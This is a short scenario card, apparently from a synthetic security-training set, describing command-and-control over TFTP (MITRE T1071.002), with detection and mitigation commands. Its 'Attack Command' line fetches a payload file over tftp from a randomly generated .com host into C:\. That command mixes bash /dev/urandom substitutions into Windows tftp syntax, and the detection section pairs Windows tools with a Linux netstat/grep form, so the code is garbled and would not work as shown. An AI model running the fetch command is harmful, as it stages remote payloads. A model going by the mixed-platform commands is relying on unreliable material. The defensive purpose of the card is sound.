---
type: campaign
scenario_id: 192
tactic: Command and Control
technique: "T1071.002: Application Layer Protocol: File Transfer Protocols"
technique_id: T1071.002
tags: [campaign, lotl, command_and_control]
---

# Using tftp to communicate with C2 server.

## Threat Description
Using tftp to communicate with C2 server.

## Attack Command
```
tftp -i $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com GET $(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bin) C:\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bin)
```

## Detection Logic
Monitor tftp: `wmic process where name='tftp.exe' get commandline | findstr GET`; Monitor TFTP traffic: `netstat -anp | grep :69`.

## Mitigation
Restrict tftp: `icacls %windir%\System32\tftp.exe /deny Everyone:RX`; Block TFTP outbound: `netsh advfirewall firewall add rule name='Block TFTP' dir=out action=block protocol=UDP remoteport=69`.

## AI Training Prompt
Train AI to detect tftp C2 communication and suggest TFTP restrictions.

## References
- MITRE ATT&CK T1071.002: https://attack.mitre.org/techniques/T1071/002/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
